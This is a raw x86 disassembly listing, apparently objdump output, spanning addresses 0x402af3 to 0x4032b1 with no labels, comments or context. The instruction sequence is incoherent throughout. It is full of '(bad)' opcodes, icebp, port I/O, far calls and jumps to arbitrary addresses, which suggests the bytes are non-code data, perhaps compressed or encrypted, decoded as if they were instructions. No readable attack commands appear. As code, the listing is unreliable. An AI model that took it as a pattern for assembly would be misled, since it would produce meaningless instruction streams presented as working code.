  402af3:	fcom   st(1)
  402af5:	test   edx,edi
  402af7:	add    al,0xf9
  402af9:	stc    
  402afa:	ds stos DWORD PTR es:[edi],eax
  402afc:	icebp  
  402afd:	cdq    
  402afe:	add    ebp,DWORD PTR [ecx+0x5]
  402b01:	jnp    0x402b35
  402b03:	lods   eax,DWORD PTR ds:[esi]
  402b04:	gs ja  0x402b3c
  402b07:	call   0x10b990be
  402b0c:	inc    esp
  402b0d:	imul   edi,DWORD PTR [ebx],0x56
  402b10:	pop    ebp
  402b11:	mov    edi,0x3c433ecc
  402b16:	sbb    dl,bl
  402b18:	fsub   st,st(3)
  402b1a:	ss or  eax,0x56123ac6
  402b20:	stos   DWORD PTR es:[edi],eax
  402b21:	call   0x791dfcf6
  402b26:	and    eax,0x603c9aad
  402b2b:	inc    esp
  402b2c:	shl    DWORD PTR [esi-0x30],0x7c
  402b30:	cmp    ch,0x31
  402b33:	js     0x402b57
  402b35:	mov    eax,ds:0xdd6f029e
  402b3a:	aad    0xfe
  402b3c:	lahf   
  402b3d:	mov    es,ebx
  402b3f:	mov    dh,0xef
  402b41:	push   edx
  402b42:	or     DWORD PTR [edi+0x16],esp
  402b45:	ds jmp 0xe8853075
  402b4b:	ficom  WORD PTR [ebp+0x5fbe0843]
  402b51:	mov    ebp,0x4f0583a1
  402b56:	add    BYTE PTR [ebp-0x17],bh
  402b59:	mov    bl,0x6c
  402b5c:	or     eax,ebp
  402b5e:	popa   
  402b5f:	and    al,0xa3
  402b61:	sahf   
  402b62:	je     0x402b5e
  402b64:	inc    edx
  402b65:	pop    es
  402b66:	inc    edx
  402b67:	fucomip st,st(1)
  402b69:	xchg   ebp,eax
  402b6a:	pop    ss
  402b6b:	lods   eax,DWORD PTR ds:[esi]
  402b6c:	xor    BYTE PTR [ecx-0x43926689],cl
  402b72:	add    BYTE PTR [edx-0x22],0xa9
  402b76:	cdq    
  402b77:	aam    0x9e
  402b79:	sub    DWORD PTR [eax],edx
  402b7b:	pop    eax
  402b7c:	test   DWORD PTR [edx],ecx
  402b7e:	(bad)  [eax-0x15]
  402b81:	xor    bh,ch
  402b83:	cmp    DWORD PTR [ebp-0x656d498e],0xf72a58b7
  402b8d:	out    dx,al
  402b8e:	dec    edx
  402b8f:	lods   eax,DWORD PTR ds:[esi]
  402b90:	rcl    DWORD PTR [esi+0x2ab3069c],0x6c
  402b97:	je     0x402bc5
  402b99:	jo     0x402bc3
  402b9b:	scas   al,BYTE PTR es:[edi]
  402b9c:	clc    
  402b9d:	lock or eax,0xd74e9b06
  402ba3:	sub    ebp,DWORD PTR [eax]
  402ba5:	pop    es
  402ba6:	out    dx,al
  402ba7:	in     eax,0x9a
  402ba9:	and    ch,bh
  402bab:	pusha  
  402bac:	pop    edi
  402bad:	adc    esi,DWORD PTR [edx]
  402baf:	test   DWORD PTR [edi],ebp
  402bb1:	(bad)  
  402bb2:	bound  esp,QWORD PTR [esi+0x1b]
  402bb5:	xor    eax,0x11a7394a
  402bba:	mov    ds:0xc6264475,al
  402bbf:	or     bl,BYTE PTR fs:[edx-0x269e78e2]
  402bc6:	retf   0x6d8d
  402bc9:	fcom   QWORD PTR [esi+0x31]
  402bcc:	add    eax,0x1c42752e
  402bd1:	sbb    eax,0x776b3585
  402bd6:	das    
  402bd7:	sti    
  402bd8:	sbb    ch,BYTE PTR [ebp+0x3b]
  402bdb:	adc    ecx,DWORD PTR [ebx]
  402bdd:	xor    DWORD PTR [edx-0x7f],edi
  402be0:	xchg   ebx,edi
  402be2:	loope  0x402b78
  402be4:	push   0x89262190
  402be9:	retf   0xc75d
  402bec:	mov    esp,DWORD PTR [eax]
  402bee:	imul   BYTE PTR [ebp-0x180e2104]
  402bf4:	push   ecx
  402bf5:	sbb    esp,ecx
  402bf7:	stc    
  402bf8:	ds pop es
  402bfa:	ins    BYTE PTR es:[edi],dx
  402bfb:	push   edx
  402bfc:	dec    esp
  402bfd:	arpl   WORD PTR [ebx-0x3a],cx
  402c00:	sub    eax,0xee7ca7d4
  402c05:	cwde   
  402c06:	add    bh,dl
  402c08:	inc    ecx
  402c09:	pop    ds
  402c0a:	gs mov dh,0x4f
  402c0d:	push   ss
  402c0e:	bound  edi,QWORD PTR [ebp-0x11]
  402c11:	imul   esp,DWORD PTR [edi-0x5f],0xffffffd5
  402c15:	inc    eax
  402c16:	scas   al,BYTE PTR es:[edi]
  402c17:	das    
  402c18:	jle    0x402bb9
  402c1a:	aaa    
  402c1b:	pop    ds
  402c1c:	js     0x402c54
  402c1e:	pop    esp
  402c1f:	dec    ecx
  402c20:	jb     0x402c2b
  402c22:	call   0xfcfc:0x554659ce
  402c29:	dec    ecx
  402c2a:	push   ds
  402c2b:	add    ecx,DWORD PTR [ebp+0x25090238]
  402c31:	and    bh,bl
  402c33:	icebp  
  402c34:	(bad)  
  402c35:	xchg   esp,eax
  402c36:	jae    0x402c26
  402c38:	xchg   ebx,eax
  402c39:	mov    edx,0x905d743d
  402c3e:	shr    DWORD PTR [ebp+0x248b90d4],1
  402c44:	int3   
  402c45:	xchg   esi,eax
  402c46:	add    eax,0x3178eaa7
  402c4b:	push   ds
  402c4c:	sub    al,0x32
  402c4e:	repnz mov eax,0x4e1a0dce
  402c54:	sbb    eax,0x8e0413e
  402c59:	enter  0x5df6,0xd4
  402c5d:	jnp    0x402c71
  402c5f:	xchg   ebx,eax
  402c60:	or     DWORD PTR [edx-0x70],ecx
  402c63:	cmp    DWORD PTR [eax],ebx
  402c65:	int3   
  402c66:	mov    esi,ecx
  402c68:	jge    0x402cbf
  402c6a:	mov    bl,0xbb
  402c6c:	fsub   QWORD PTR [esi+0x39]
  402c6f:	xchg   ebx,eax
  402c70:	retf   0x7528
  402c73:	(bad)  
  402c74:	pop    edx
  402c75:	add    bh,al
  402c77:	daa    
  402c78:	jge    0x402c6e
  402c7a:	mov    edi,0xf77adee6
  402c7f:	sub    esi,eax
  402c81:	stc    
  402c82:	add    DWORD PTR [eax+eax*2],edx
  402c85:	ins    BYTE PTR es:[edi],dx
  402c86:	fnstcw WORD PTR [ebx-0x15]
  402c89:	mov    ds:0x589bce8d,al
  402c8e:	xchg   esi,eax
  402c8f:	add    bl,BYTE PTR [edx]
  402c91:	adc    cl,0xb6
  402c94:	ja     0x402c1b
  402c96:	push   edx
  402c97:	dec    eax
  402c98:	cmc    
  402c99:	je     0x402c8f
  402c9b:	fwait
  402c9c:	(bad)  
  402c9d:	pushf  
  402c9e:	or     al,0x60
  402ca0:	adc    DWORD PTR [ecx+0x63],edx
  402ca3:	cs pop ss
  402ca5:	retf   0x978d
  402ca8:	ds sahf 
  402caa:	popf   
  402cab:	mov    edx,0xa2288645
  402cb0:	out    dx,eax
  402cb1:	js     0x402c93
  402cb3:	sbb    DWORD PTR [esi+0x46],esp
  402cb6:	imul   esi,DWORD PTR [ebx],0x478244d4
  402cbc:	jo     0x402c5e
  402cbe:	inc    edi
  402cbf:	inc    esp
  402cc0:	sub    ebx,DWORD PTR [esi-0x39]
  402cc3:	(bad)  
  402cc5:	lahf   
  402cc6:	cdq    
  402cc7:	xchg   esi,eax
  402cc8:	and    al,BYTE PTR [edx]
  402cca:	(bad)  
  402ccb:	and    esp,DWORD PTR ds:0xc4373f4c
  402cd1:	inc    ah
  402cd3:	stos   BYTE PTR es:[edi],al
  402cd4:	mov    BYTE PTR [edi-0x4c],dh
  402cd7:	jne    0x402ce1
  402cd9:	test   al,0x17
  402cdb:	shl    bh,1
  402cdd:	lahf   
  402cde:	pop    ebx
  402cdf:	ja     0x402c71
  402ce1:	jno    0x402cbe
  402ce3:	enter  0xeab6,0xd
  402ce7:	mov    ch,0x8f
  402ce9:	div    BYTE PTR ds:0x6cb267af
  402cef:	jae    0x402c78
  402cf1:	out    0xa9,eax
  402cf3:	dec    edx
  402cf4:	mov    BYTE PTR [esi],bl
  402cf6:	sbb    cl,dl
  402cf8:	enter  0x9c4a,0x55
  402cfc:	jl     0x402cdd
  402cfe:	imul   ebx,DWORD PTR [esi],0xee708cf1
  402d04:	aam    0x91
  402d06:	xchg   edi,eax
  402d07:	lods   eax,DWORD PTR ds:[esi]
  402d08:	add    eax,0x49c1766
  402d0d:	jne    0x402d49
  402d0f:	aas    
  402d10:	shl    DWORD PTR [eax],0x6
  402d13:	jle    0x402d82
  402d15:	fnstsw WORD PTR [ebx+ebx*4+0x1191fa70]
  402d1c:	mov    al,0xa8
  402d1e:	push   eax
  402d1f:	aad    0xd6
  402d21:	mov    al,0xca
  402d23:	clc    
  402d24:	inc    esi
  402d25:	test   eax,0x98f07e28
  402d2a:	sbb    eax,0xd9b07990
  402d2f:	and    edx,DWORD PTR [esi+0x53]
  402d32:	xor    eax,0x5d5f6e83
  402d37:	jnp    0x402d70
  402d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d3a:	retf   0x7eb
  402d3d:	loop   0x402d4f
  402d3f:	add    DWORD PTR [edx+0xf],0xe4136f26
  402d46:	ja     0x402d7c
  402d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d49:	or     al,0x45
  402d4b:	or     ah,bl
  402d4d:	mov    DWORD PTR [eax],edx
  402d4f:	or     esi,0xacadd2ad
  402d55:	xchg   eax,ebx
  402d57:	outs   dx,DWORD PTR ds:[esi]
  402d58:	lods   al,BYTE PTR ds:[esi]
  402d59:	pop    ebp
  402d5a:	sbb    eax,0x92bc4c7b
  402d5f:	lds    eax,FWORD PTR [ebx+0x21]
  402d62:	mov    dh,0xbb
  402d64:	je     0x402d75
  402d66:	fcom   DWORD PTR [edx+0x626638bc]
  402d6c:	cmp    BYTE PTR [edx+0x44],ah
  402d6f:	popf   
  402d70:	pop    eax
  402d71:	adc    dl,BYTE PTR [esi-0x5e]
  402d74:	dec    esi
  402d75:	jae    0x402d8e
  402d77:	push   esi
  402d78:	repnz mov ebp,DWORD PTR [eax-0x5a]
  402d7c:	jecxz  0x402db4
  402d7e:	and    eax,0x398c2235
  402d83:	shl    ch,0xc7
  402d86:	sub    dh,dh
  402d88:	inc    esp
  402d89:	push   ss
  402d8a:	adc    DWORD PTR [ecx+0x43b55412],esi
  402d90:	bound  edi,QWORD PTR [eax]
  402d92:	ins    DWORD PTR es:[edi],dx
  402d93:	pop    esp
  402d94:	pop    ds
  402d95:	not    edx
  402d97:	mov    eax,ds:0x23c94952
  402d9c:	inc    eax
  402d9d:	jno    0x402d72
  402d9f:	call   0x5e1c:0xbe1b21b8
  402da6:	(bad)  
  402da7:	loopne 0x402d91
  402da9:	dec    eax
  402daa:	sbb    BYTE PTR [ebx-0x60108e93],bh
  402db0:	mov    dl,BYTE PTR [edx]
  402db2:	dec    eax
  402db3:	adc    BYTE PTR [edi+0x65face8b],0x46
  402dba:	mov    bl,0xf0
  402dbc:	ja     0x402d93
  402dbe:	xchg   edi,eax
  402dbf:	and    al,0x8
  402dc1:	rcl    BYTE PTR [eax],1
  402dc3:	ror    DWORD PTR [esi-0x3b],0x25
  402dc7:	inc    esi
  402dc8:	cmp    eax,0x8d5242d0
  402dcd:	data16 das 
  402dcf:	push   ds
  402dd0:	inc    esi
  402dd1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402dd3:	push   esp
  402dd4:	cmp    ah,dl
  402dd6:	shl    BYTE PTR [eax+edi*4],cl
  402dd9:	push   cs
  402dda:	push   ecx
  402ddb:	cmp    ecx,ebx
  402ddd:	adc    BYTE PTR [ecx-0x24ed3a61],0x3
  402de4:	mov    bh,0x5e
  402de6:	or     eax,0x3a3f4853
  402deb:	imul   edx,DWORD PTR [esi+0x77145a63],0x79
  402df2:	mov    edi,0x9fa3a500
  402df7:	fsub   QWORD PTR [edx+eax*1-0xe]
  402dfb:	mov    edi,DWORD PTR [ebp+0x0]
  402dfe:	repnz aam 0xce
  402e01:	or     eax,0x2960ad5b
  402e06:	sbb    eax,DWORD PTR [ecx+0x44574e70]
  402e0c:	mov    WORD PTR [ebp-0xd8fa770],es
  402e12:	cmp    dl,ah
  402e14:	inc    edi
  402e15:	mov    ecx,esi
  402e17:	sti    
  402e18:	add    edx,ebx
  402e1a:	mov    BYTE PTR [edi+ebp*1+0x3d],dl
  402e1e:	pop    eax
  402e1f:	lds    esp,FWORD PTR [edi-0x7d9f708c]
  402e25:	ja     0x402df2
  402e27:	nop
  402e28:	fdiv   DWORD PTR [ecx+0x238e489f]
  402e2e:	popa   
  402e2f:	std    
  402e30:	and    ah,BYTE PTR ds:0x4b16db03
  402e36:	(bad)  
  402e37:	dec    edi
  402e38:	push   ebp
  402e39:	mov    edi,0xb4127441
  402e3e:	(bad)  
  402e40:	aad    0xdb
  402e42:	inc    ebp
  402e43:	dec    ebx
  402e44:	jl     0x402e03
  402e46:	or     BYTE PTR [edi-0x3],dl
  402e49:	adc    BYTE PTR [edx-0x4bbebece],ah
  402e4f:	inc    ebx
  402e50:	hlt    
  402e51:	sub    DWORD PTR [ebx+0x1e7908d0],esi
  402e57:	mov    gs,WORD PTR [edi]
  402e59:	pop    ss
  402e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e5b:	mov    esp,0xca89d58f
  402e60:	pop    eax
  402e61:	leave  
  402e62:	jbe    0x402eba
  402e64:	je     0x402deb
  402e66:	mov    edx,edi
  402e68:	mov    edx,0x6d7fd8b5
  402e6d:	push   edi
  402e6e:	pop    esp
  402e6f:	addr16 jae 0x402eed
  402e72:	(bad)  
  402e73:	lds    edx,FWORD PTR [ecx+0x7227f3e5]
  402e79:	aaa    
  402e7a:	jp     0x402ee0
  402e7c:	pop    ds
  402e7d:	loope  0x402e8b
  402e7f:	jns    0x402e9b
  402e81:	adc    esp,DWORD PTR [ebp-0x69]
  402e84:	dec    esp
  402e85:	shl    DWORD PTR [edx+0x3687486d],1
  402e8b:	sar    BYTE PTR [esi-0x54],0x6
  402e8f:	dec    eax
  402e90:	lea    ebx,[edx+0x2a]
  402e93:	add    bh,bh
  402e95:	sbb    BYTE PTR [ebx+0x3a485271],bh
  402e9b:	and    cl,BYTE PTR [ecx-0x7]
  402e9e:	mov    bl,BYTE PTR [edi+edx*4]
  402ea1:	lea    ebx,[ecx+ecx*8+0x65f41894]
  402ea8:	jo     0x402ed9
  402eaa:	pop    ebx
  402eab:	stos   DWORD PTR es:[edi],eax
  402eac:	xor    DWORD PTR [ebp+0xc5aab54],esi
  402eb2:	pop    ebx
  402eb3:	fs pop ebx
  402eb5:	(bad)  
  402eb6:	jecxz  0x402e47
  402eb8:	cmp    cl,BYTE PTR [ecx]
  402eba:	rcr    eax,cl
  402ebc:	loop   0x402f2b
  402ebe:	dec    esi
  402ebf:	xor    eax,0x20dc6437
  402ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ec5:	cs aas 
  402ec7:	es pop edi
  402ec9:	mov    ecx,0xdce02561
  402ece:	lds    edi,FWORD PTR [edx+0x50b832a2]
  402ed4:	sbb    DWORD PTR [ecx],edx
  402ed6:	mov    edi,ebx
  402ed8:	push   0xdc3bf335
  402edd:	cwde   
  402ede:	sub    dh,dh
  402ee0:	icebp  
  402ee1:	push   0x92ca0f17
  402ee6:	mov    al,ds:0x9d315553
  402eeb:	mov    esi,0x8b1a1a3a
  402ef0:	fadd   DWORD PTR [ebp-0x3e87f94f]
  402ef6:	jmp    0x402ec0
  402ef8:	and    BYTE PTR [ebp+0x63],ah
  402efb:	pop    ecx
  402efc:	xor    DWORD PTR [edi-0x4e8d170c],edi
  402f02:	and    DWORD PTR [ecx],ebp
  402f04:	push   ecx
  402f05:	and    DWORD PTR [ecx+0x14],ebx
  402f08:	clc    
  402f09:	xchg   esp,eax
  402f0a:	mov    esp,0x7cda5c7e
  402f0f:	jmp    0xe1e3:0x1f7058ab
  402f16:	adc    al,0x6f
  402f18:	gs test al,0x14
  402f1b:	inc    edi
  402f1c:	lods   eax,DWORD PTR ds:[esi]
  402f1d:	dec    ecx
  402f1e:	add    DWORD PTR [esi+0x67],0x600d9182
  402f25:	xor    eax,0x389dc3d8
  402f2a:	(bad)  
  402f2b:	in     al,0xae
  402f2d:	pop    eax
  402f2e:	pop    ds
  402f2f:	fcomip st,st(1)
  402f31:	add    ah,BYTE PTR [ecx+0x56c402ee]
  402f37:	mov    eax,0xd2eb9f02
  402f3c:	lods   eax,DWORD PTR ds:[esi]
  402f3d:	mov    WORD PTR [ecx-0x407d7bac],gs
  402f43:	jl     0xdc7801a0
  402f49:	(bad)  [esi]
  402f4b:	mov    al,0x8e
  402f4d:	(bad)  
  402f4e:	mov    edx,0x8a0f7110
  402f53:	addr16 popf 
  402f55:	fist   WORD PTR [edi]
  402f57:	stc    
  402f58:	jmp    0x402f63
  402f5a:	in     eax,0x14
  402f5c:	fcomp  DWORD PTR [esp+ebp*8]
  402f5f:	jae    0x402f55
  402f61:	and    esi,edi
  402f63:	pop    ebx
  402f64:	(bad)  
  402f65:	(bad)  
  402f66:	fiadd  DWORD PTR [edx]
  402f68:	daa    
  402f69:	cmp    eax,DWORD PTR [edi+0x3b6554ee]
  402f6f:	test   bh,ah
  402f71:	(bad)  
  402f72:	xchg   ebp,eax
  402f73:	jmp    0xf8d86f6
  402f78:	mov    bl,0x43
  402f7a:	cld    
  402f7b:	mov    esi,0xd7ff761e
  402f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f81:	retf   0xe98e
  402f84:	jmp    0x8884:0x5f5f7d09
  402f8b:	(bad)  
  402f8c:	sub    bh,bh
  402f8e:	mov    dl,0x37
  402f90:	mov    ebx,0xa64edb7
  402f95:	pop    es
  402f96:	fisub  DWORD PTR [esi]
  402f98:	test   DWORD PTR ds:0x3cb71251,ebp
  402f9e:	out    dx,al
  402f9f:	sub    edx,edi
  402fa1:	(bad)  
  402fa2:	shl    ch,0xef
  402fa5:	sub    bh,BYTE PTR [esi-0x2139737e]
  402fab:	inc    eax
  402fac:	je     0x402fdf
  402fae:	push   esp
  402faf:	xchg   esi,eax
  402fb0:	jb     0x402f82
  402fb2:	retf   
  402fb3:	add    BYTE PTR [ebx-0x39],dl
  402fb6:	jmp    0x8fe44dc2
  402fbb:	sub    BYTE PTR [esi],cl
  402fbd:	pushf  
  402fbe:	(bad)  
  402fbf:	cmp    ecx,DWORD PTR [esi]
  402fc1:	inc    eax
  402fc2:	cmp    eax,0xf519cbca
  402fc7:	ret    
  402fc8:	sub    dh,dl
  402fca:	icebp  
  402fcb:	inc    ecx
  402fcc:	inc    ebx
  402fcd:	cwde   
  402fce:	push   ecx
  402fcf:	stos   BYTE PTR es:[edi],al
  402fd0:	and    eax,DWORD PTR [eax-0x42592cf0]
  402fd6:	rcr    DWORD PTR [ebx],0xfa
  402fd9:	retf   
  402fda:	sar    esp,1
  402fdc:	push   esp
  402fdd:	dec    ebp
  402fde:	cmp    eax,0x1130dc9b
  402fe3:	and    bl,BYTE PTR [eax]
  402fe5:	xchg   edx,eax
  402fe6:	inc    esi
  402fe7:	ss push ecx
  402fe9:	jno    0x40305b
  402feb:	shl    DWORD PTR [ecx],1
  402fed:	icebp  
  402fee:	xchg   BYTE PTR [esi-0x5],dl
  402ff1:	std    
  402ff2:	mov    eax,ds:0x25e15e85
  402ff7:	mov    cl,0xe3
  402ff9:	dec    edi
  402ffa:	loop   0x403015
  402ffc:	cmp    al,0x16
  402ffe:	inc    ecx
  402fff:	pop    eax
  403000:	ins    DWORD PTR es:[edi],dx
  403001:	adc    bh,al
  403003:	mov    ds:0xed7920fb,al
  403008:	scas   al,BYTE PTR es:[edi]
  403009:	scas   al,BYTE PTR es:[edi]
  40300a:	das    
  40300b:	mov    bl,0x58
  40300d:	or     DWORD PTR [eax+edi*4],ebx
  403010:	mov    ebx,0xa9d98778
  403015:	adc    eax,DWORD PTR [ecx+eax*8-0x469373d5]
  40301c:	pop    ebp
  40301d:	pusha  
  40301e:	xor    DWORD PTR [esi+0x6],edx
  403021:	dec    ebp
  403022:	call   0xa9fc:0x481dd7e7
  403029:	push   edi
  40302a:	inc    ebp
  40302b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40302c:	dec    ebp
  40302d:	les    edi,FWORD PTR [edx]
  40302f:	mov    bl,BYTE PTR [ebx]
  403031:	loop   0x4030a8
  403033:	pop    ds
  403034:	jmp    0xa5ff5ae1
  403039:	push   ds
  40303a:	jl     0x403033
  40303c:	cdq    
  40303d:	repz (bad)
  403040:	xchg   DWORD PTR [ecx+esi*4+0x6],edi
  403044:	les    eax,FWORD PTR [ebx+edx*2]
  403047:	sub    al,0xb7
  403049:	inc    edx
  40304a:	sbb    al,0x67
  40304c:	xchg   esp,eax
  40304d:	add    BYTE PTR [esi-0x7d233e3a],bh
  403053:	cli    
  403054:	pop    ss
  403055:	mov    ds:0x7d8d0d66,eax
  40305a:	sbb    DWORD PTR [edi+0x181c59d],edi
  403060:	(bad)  
  403061:	out    dx,eax
  403062:	jo     0x4030b0
  403064:	mov    bh,0xe6
  403066:	not    bl
  403068:	mov    eax,ds:0xdd51ecb9
  40306d:	sar    al,cl
  40306f:	mov    DWORD PTR [eax+0x3f],ecx
  403072:	clc    
  403073:	inc    eax
  403074:	ret    0x2930
  403077:	fldenv [edx]
  403079:	push   edx
  40307a:	cwde   
  40307b:	xchg   edi,eax
  40307c:	mov    esp,0x59718c78
  403081:	cld    
  403082:	lods   al,BYTE PTR gs:[esi]
  403084:	imul   ebp,ecx,0xa7713a80
  40308a:	call   0x9e232b1
  40308f:	adc    al,0xa
  403091:	dec    DWORD PTR [edx+0x5b]
  403094:	mov    ecx,0x46c57a71
  403099:	xchg   esp,eax
  40309a:	push   0xfffffff1
  40309c:	arpl   WORD PTR [ecx+0x6f],sp
  40309f:	mov    dl,0xa4
  4030a1:	or     BYTE PTR [esi+0x6b],0x76
  4030a5:	fiadd  WORD PTR [edi-0x1]
  4030a8:	xchg   ecx,eax
  4030a9:	loop   0x4030e8
  4030ab:	das    
  4030ac:	and    eax,0xde6295cb
  4030b1:	xor    al,0xbd
  4030b3:	xchg   DWORD PTR [edx+0x4e],ecx
  4030b6:	dec    ecx
  4030b7:	retf   0x4fa6
  4030ba:	and    bh,BYTE PTR [ebx]
  4030bc:	xchg   ebx,eax
  4030bd:	jno    0x4030b1
  4030bf:	stos   BYTE PTR es:[edi],al
  4030c0:	sar    DWORD PTR [esi],0xcd
  4030c3:	sub    BYTE PTR [esi-0x4f39ada8],ah
  4030c9:	adc    DWORD PTR [eax+0x57ef0cc4],esp
  4030cf:	and    eax,0x735b9ab6
  4030d4:	fcomp  DWORD PTR [ebx]
  4030d6:	mov    es,WORD PTR [edi+0x233c5c65]
  4030dc:	call   0xc6f31b0a
  4030e1:	sbb    ebp,DWORD PTR [eax-0x2a]
  4030e4:	push   ss
  4030e5:	add    al,0xd6
  4030e7:	mov    cl,0xd5
  4030e9:	std    
  4030ea:	mov    edi,0xf9182ec2
  4030ef:	jb     0x4030b3
  4030f1:	outs   dx,BYTE PTR ds:[esi]
  4030f2:	js     0x403107
  4030f4:	ds sub dl,dl
  4030f7:	(bad)  
  4030f9:	and    DWORD PTR [ebp+0x3de75259],0xffffffbb
  403100:	bound  eax,QWORD PTR [esi+0x25]
  403103:	cmp    eax,0xcdcdec98
  403108:	cmp    BYTE PTR [edi],0x8
  40310b:	sbb    al,BYTE PTR [edx+ecx*1+0x4d46db1c]
  403112:	jmp    0xb3953d34
  403117:	and    eax,0x4f751f94
  40311c:	out    dx,al
  40311d:	mov    esp,0xbf7eddf7
  403122:	adc    bh,0xa1
  403125:	jb     0x403109
  403127:	nop
  403128:	sbb    edi,0x7fec05fc
  40312e:	int3   
  40312f:	mov    cl,0xbc
  403131:	cld    
  403132:	and    BYTE PTR [ecx],ah
  403134:	jecxz  0x403165
  403136:	popa   
  403137:	and    ch,bh
  403139:	jno    0x4031ae
  40313b:	xor    dl,dh
  40313d:	mov    ds:0x1a25afe0,al
  403142:	and    ah,BYTE PTR [eax+0x5f1f841a]
  403148:	jl     0x4030f4
  40314a:	cld    
  40314b:	sub    eax,ebp
  40314d:	dec    edx
  40314e:	dec    esi
  40314f:	fsub   DWORD PTR [ecx-0x506f5bcf]
  403155:	(bad)  
  403157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403158:	(bad)  
  40315a:	jmp    0x403157
  40315c:	repz mov edi,0xb53f2c5
  403162:	push   es
  403163:	mov    edx,0x382dd042
  403168:	test   al,0xaf
  40316a:	pop    ecx
  40316b:	pop    edi
  40316c:	fild   DWORD PTR [edx-0x113b7a63]
  403172:	sbb    esp,DWORD PTR [esp+ecx*1]
  403175:	push   ss
  403176:	outs   dx,BYTE PTR ds:[esi]
  403177:	jp     0x4031c5
  403179:	inc    esi
  40317a:	xchg   esp,eax
  40317b:	xor    DWORD PTR [esi*4-0x4c749e06],ecx
  403182:	lods   eax,DWORD PTR ds:[esi]
  403183:	fbld   TBYTE PTR [ecx+esi*4-0xaf4e1f3]
  40318a:	xor    DWORD PTR [eax],eax
  40318c:	mov    al,ds:0xc4c6ddb
  403191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403192:	stos   DWORD PTR es:[edi],eax
  403193:	jg     0x403129
  403195:	not    BYTE PTR [esi+0x61]
  403198:	aas    
  403199:	xor    al,0x9a
  40319b:	fwait
  40319c:	fwait
  40319d:	aaa    
  40319e:	xchg   DWORD PTR [esi+0x5c],edx
  4031a1:	fstp   DWORD PTR [esi+ecx*8]
  4031a4:	or     BYTE PTR [edi+0x51038bf0],bl
  4031aa:	mov    esi,0x6fd847cb
  4031af:	sbb    BYTE PTR [ebp+0x17],bh
  4031b2:	cdq    
  4031b3:	pop    ebp
  4031b4:	fldcw  WORD PTR [ebx*4-0x60b57937]
  4031bb:	mov    dh,BYTE PTR [ebx-0x1f]
  4031be:	ror    BYTE PTR [edx+edi*4+0x42027e05],1
  4031c5:	mov    ds:0x9a698cbf,al
  4031ca:	xchg   esi,eax
  4031cb:	inc    ebx
  4031cc:	retf   0x3c16
  4031cf:	ret    
  4031d0:	(bad)  
  4031d2:	fwait
  4031d3:	push   ecx
  4031d4:	or     cl,BYTE PTR [edi-0x16]
  4031d7:	mov    edi,DWORD PTR [ebp-0x66f527dd]
  4031dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031de:	and    cl,BYTE PTR [eax+0x51030823]
  4031e4:	call   0x3d66:0x2cd2dd67
  4031eb:	mov    BYTE PTR [ebp+0x6f6decab],bh
  4031f1:	jae    0x40317a
  4031f3:	mov    al,0xc2
  4031f5:	mov    eax,0xe6be451
  4031fa:	pop    esp
  4031fb:	call   0xf6ba6044
  403200:	fs imul ecx,edi,0xffffffc6
  403204:	loopne 0x403265
  403206:	jp     0x403220
  403208:	xlat   BYTE PTR ds:[ebx]
  403209:	arpl   WORD PTR [ecx-0x4f],bx
  40320c:	or     al,0xc2
  40320e:	jecxz  0x40325d
  403210:	scas   eax,DWORD PTR es:[edi]
  403211:	fdivp  st(6),st
  403213:	xlat   BYTE PTR ds:[ebx]
  403214:	fsubr  DWORD PTR ds:0xe1046d9f
  40321a:	adc    esi,ebp
  40321c:	mov    eax,0xc5cdb159
  403221:	iret   
  403222:	jmp    0x8299:0x20cf705a
  403229:	adc    esi,DWORD PTR [ecx+edi*2-0x7a]
  40322d:	jge    0x403248
  40322f:	push   esi
  403230:	loopne 0x40324a
  403232:	dec    esi
  403233:	add    edi,DWORD PTR [esi]
  403235:	dec    ecx
  403236:	and    eax,eax
  403238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403239:	jo     0x4031dc
  40323b:	fadd   st(5),st
  40323d:	dec    ebp
  40323e:	ds jb  0x4032bf
  403241:	push   edi
  403242:	(bad)  
  403243:	dec    edi
  403244:	add    dh,bh
  403246:	stc    
  403247:	fsub   DWORD PTR [ebx]
  403249:	xchg   esp,eax
  40324a:	lea    esi,[edi+0x45]
  40324d:	popa   
  40324e:	je     0x4032c1
  403250:	mov    bl,0x74
  403252:	push   edi
  403253:	cmp    DWORD PTR [edx+ebp*2],0x31b8d6b1
  40325a:	dec    ebp
  40325b:	(bad)  
  40325c:	sti    
  40325d:	xchg   ecx,eax
  40325e:	ins    DWORD PTR es:[edi],dx
  40325f:	jmp    0x403279
  403261:	and    al,0xe9
  403263:	imul   dl
  403265:	fisub  WORD PTR [edi]
  403267:	xchg   ecx,eax
  403268:	daa    
  403269:	and    al,0x9b
  40326b:	retf   
  40326c:	outs   dx,BYTE PTR ds:[esi]
  40326d:	xchg   BYTE PTR [ecx],ch
  40326f:	mov    es,eax
  403271:	retf   0xdae7
  403274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403275:	jl     0x4032a6
  403277:	sbb    esi,0x8b193ef8
  40327d:	sub    DWORD PTR [eax+edi*1-0x9],esp
  403281:	mov    ecx,ebp
  403283:	inc    edi
  403284:	out    dx,eax
  403285:	sub    eax,0x515ca7d4
  40328a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40328b:	inc    esp
  40328c:	cli    
  40328d:	pop    eax
  40328e:	fucomi st,st(6)
  403290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403292:	(bad)  
  403293:	in     eax,dx
  403294:	push   ecx
  403295:	ins    BYTE PTR es:[edi],dx
  403296:	pop    ebp
  403297:	inc    esi
  403298:	mov    ecx,0x70d1f9e3
  40329d:	dec    esp
  40329e:	cs cwde 
  4032a0:	gs pusha 
  4032a2:	shr    BYTE PTR [ebx],cl
  4032a4:	sar    BYTE PTR [ecx],1
  4032a6:	push   0x5ed2b982
  4032ab:	fidiv  DWORD PTR [edi-0x78716a98]
  4032b1:	inc    esp
